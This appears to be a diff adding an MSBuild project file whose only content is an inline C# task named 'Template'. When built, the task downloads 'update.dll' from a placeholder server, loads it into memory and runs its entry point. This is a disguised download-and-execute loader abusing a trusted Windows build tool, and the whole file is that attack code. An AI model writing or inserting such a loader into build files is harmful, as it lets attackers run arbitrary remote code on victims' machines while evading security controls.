@@ -1,0 +1,27 @@
+<Project ToolsVersion="4.0"
+    xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+    <Target Name="Template">
+        <Template />
+    </Target>
+    <UsingTask TaskName="Template" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
+        <Task>
+            <Reference Include="System.Management.Automation" />
+            <Code Type="Class" Language="cs">
+                <![CDATA[
+                    using Microsoft.Build.Utilities;
+                    using System.Net;
+                    using System.Reflection;
+
+                    public class Template : Task, ITask {
+                        public override bool Execute() {
+                            byte[] dllBytes = new WebClient().DownloadData("http://<server>/update.dll");
+                            Assembly asm = Assembly.Load(dllBytes);
+                            asm.EntryPoint.Invoke(null, new object[] { new string[] { } });
+                            return true;
+                        }
+                    }
+                ]]>
+            </Code>
+        </Task>
+    </UsingTask>
+</Project>
